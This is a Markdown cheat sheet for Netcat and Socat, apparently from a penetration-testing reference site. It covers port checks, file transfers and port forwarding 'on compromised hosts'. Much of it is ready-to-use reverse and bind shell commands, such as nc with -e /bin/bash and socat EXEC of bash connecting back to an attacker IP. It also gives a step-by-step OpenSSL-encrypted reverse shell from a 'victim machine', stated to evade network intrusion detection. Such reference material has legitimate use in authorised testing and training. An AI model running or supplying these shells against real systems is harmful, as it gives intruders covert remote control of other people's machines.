---
title: "Netcat & Socat"
description: "Netcat and Socat usage, file transfers, port forwarding, and shell techniques"
---

Netcat (`nc`) and Socat are versatile utilities for network communication, testing, and debugging. Socat is a more modern, advanced tool that supports encryption, multiple sockets, and bidirectional transfers.

### Netcat (`nc`)

#### Basic Connection & Port Scanning

| **Command** | **Description** |
| :--- | :--- |
| `nc -zv <target_ip> <port>` | Check if a port is open (verbose connect mode without sending data) |
| `nc -zv <target_ip> <port_start>-<port_end>` | Simple port scan over a range of ports |
| `nc -uv <target_ip> <port>` | Connect to a UDP port |

#### File Transfer

| **Command** | **Description** |
| :--- | :--- |
| **On Receiver:** `nc -lvnp <port> > file.txt` | Prepare listener to receive file |
| **On Sender:** `nc <ip> <port> < file.txt` | Send file to listener |
| **On Receiver:** `tar -xvzf - \| nc -lvnp <port>` | Extract tar archive received over netcat |
| **On Sender:** `tar -cvzf - directory/ \| nc <ip> <port>` | Pack and transfer directory to listener |

#### Shell Bindings

| **Command** | **Description** |
| :--- | :--- |
| **Reverse Shell:** `nc <ip> <port> -e /bin/bash` | Execute shell and send to IP/Port (OpenBSD) |
| **Bind Shell:** `nc -lvnp <port> -e /bin/bash` | Bind shell to local port, waiting for connection |

---

### Socat

Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them.

#### File Transfer

| **Command** | **Description** |
| :--- | :--- |
| **On Receiver:** `socat TCP4-LISTEN:<port>,reuseaddr open:file.txt,create,append` | Listen on port and save output to file |
| **On Sender:** `socat FILE:file.txt TCP4:<ip>:<port>` | Read file and send to remote IP/Port |

#### Interactive Reverse & Bind Shells

Unlike Netcat, Socat can pass full terminal attributes (`stderr`, keyboard signals, window resizing) to provide a fully functional interactive TTY.

| **Command** | **Description** |
| :--- | :--- |
| **TTY Listener:** `socat FILE:`tty`,raw,echo=0 TCP-LISTEN:<port>,reuseaddr` | Listen for TTY reverse shell connection |
| **Target Client:** `socat TCP:<ip>:<port> EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane` | Connect back with full interactive TTY properties |
| **Bind TTY:** `socat TCP-LISTEN:<port>,reuseaddr EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane` | Listen on target and bind a TTY shell |
| **Client Connect:** `socat FILE:`tty`,raw,echo=0 TCP:<ip>:<port>` | Connect to target's bound TTY shell |

#### Port Forwarding / Redirection

Socat is commonly used for port redirection on compromised hosts.

| **Command** | **Description** |
| :--- | :--- |
| `socat TCP4-LISTEN:<local_port>,fork TCP4:<remote_ip>:<remote_port>` | Forward local port to a remote service (fork permits multiple connections) |
| `socat TCP4-LISTEN:<local_port>,fork UDP4:<remote_ip>:<remote_port>` | Relay incoming TCP traffic to a remote UDP port |

#### Encrypted Connections (OpenSSL)

Create encrypted reverse shells using SSL/TLS certificates to evade network IDS detection.

```bash
# Step 1: Generate a self-signed certificate on the attacker machine
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem

# Step 2: Set up an SSL listener on the attacker machine
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0

# Step 3: Connect back from the victim machine
socat OPENSSL:<attacker_ip>:<port>,verify=0 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
```
